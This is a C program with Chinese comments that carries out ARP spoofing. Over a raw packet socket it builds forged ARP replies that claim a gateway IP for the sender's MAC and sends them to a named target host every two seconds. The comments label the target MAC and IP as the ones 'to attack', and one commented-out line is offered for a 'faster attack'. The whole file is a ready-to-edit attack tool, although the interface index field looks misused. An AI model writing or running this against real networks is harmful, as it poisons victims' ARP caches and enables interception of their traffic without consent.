#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>

#include <linux/if_packet.h>
#include <net/ethernet.h>


unsigned char MAC_SPOOFING[6]={0x00, 0x00, 0x00, 0x00, 0x00, 0x00};//fix me

unsigned char MAC_SOURCE[6]={0x00, 0x0c, 0x29, 0xab, 0x9a, 0xd7};//fix me

//冒充的IP (ex: gateway)
#define IP_TRICK "192.168.136.2"//fix me

//要攻擊的MAC
unsigned char MAC_TARGET[6]={0x00, 0x0c, 0x29, 0xd1, 0xab, 0x11};//fix me

//要攻擊的IP
#define IP_TARGET "192.168.136.132"//fix me

typedef unsigned char  u8;
typedef unsigned short u16;
typedef unsigned int   u32;

#define Debug_printf(errno)                             \
    do {                                                \
        printf("socket faulure: %s\n", strerror(errno));\
    } while(0)

struct arp_packet {
    u8  mac_target[6];
    u8  mac_source[6];
    u16 ethertype;
    u16 hw_type;
    u16 proto_type;
    u8  mac_addr_len;
    u8  ip_addr_len;
    u16 operation_code;
    u8  mac_sender[6];
    u32 ip_sender;
    u8  mac_receiver[6];
    u32 ip_receiver; 
} __attribute__((packed));


int main(void)
{
    int sfd, len;
    struct arp_packet arp;
    struct in_addr inaddr_sender, inaddr_receiver;
    struct sockaddr_ll sl;
    sfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(-1 == sfd)
    {
        printf("socket faulure: %s\n", strerror(errno));
    }
    memset(&arp, 0, sizeof(arp));
 
    //padding package
    memcpy(arp.mac_target, MAC_TARGET, sizeof(MAC_TARGET));
    memcpy(arp.mac_source, MAC_SOURCE, sizeof(MAC_SOURCE));
    arp.ethertype = htons(ETH_P_ARP);
    arp.hw_type = htons(0x1);
    arp.proto_type = htons(ETH_P_IP);
    arp.mac_addr_len = ETH_ALEN;
    arp.ip_addr_len = 4;
    arp.operation_code = htons(0x2);    // 0x1表示ARP請求包,0x2表示應答包
    memcpy(arp.mac_sender, MAC_SOURCE, sizeof(MAC_SOURCE));
    inet_aton(IP_TRICK, &inaddr_sender);
    memcpy(&arp.ip_sender, &inaddr_sender, sizeof(inaddr_sender));
    memcpy(arp.mac_receiver, MAC_TARGET, sizeof(MAC_TARGET));
    inet_aton(IP_TARGET, &inaddr_receiver);
    memcpy(&arp.ip_receiver, &inaddr_receiver, sizeof(inaddr_receiver));
 
    memset(&sl, 0, sizeof(sl));
    sl.sll_family = AF_PACKET;
    sl.sll_ifindex = IFF_BROADCAST;
    while(1)
    {
        len = sendto(sfd, &arp, sizeof(arp), 0, (struct sockaddr*)&sl, sizeof(sl));
        if(-1 == len)
        {
            printf("sendto faulure: %s\n", strerror(errno));
        }
        else
            printf("sendto over \n");
        sleep(2);
        //usleep(1000); //更快的攻擊
    }
    return 0;
}
